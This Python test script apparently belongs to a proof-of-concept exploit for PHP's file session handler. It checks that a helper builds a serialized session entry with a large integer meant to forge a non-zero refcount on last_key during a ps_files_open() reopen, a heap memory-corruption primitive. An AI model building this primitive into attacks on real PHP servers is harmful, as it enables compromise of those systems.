#!/usr/bin/env python3 -I
"""Verifier for last_key_safe_reopen.py (offline; no lab needed).

Asserts the reopen-forcer's groundable artifact: the first `php`-serialized session entry
(`name|i:value;`) whose large integer gives the forged last_key a non-zero refcount on the
ps_files_open() reopen DELREF.

    python3 -I poc/primitives/write/verify_last_key_safe_reopen.py

The integer that lands on last_key's refcount word, and the slot it aliases, require
per-dangle heap-aliasing calibration.
"""
from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write import last_key_safe_reopen as lk  # noqa: E402


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True
    e = lk.large_int_first_entry()
    ok &= check("default entry = b'a|i:1099511627776;'", e == b"a|i:1099511627776;")
    ok &= check("php serialize_handler record shape name|i:value;",
                lk.large_int_first_entry(b"k", 42) == b"k|i:42;")
    ok &= check("value is a large int (non-zero refcount bytes)", lk.DEFAULT_VALUE >= (1 << 32))
    print("\n==== verify_last_key_safe_reopen: %s ===="
          % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
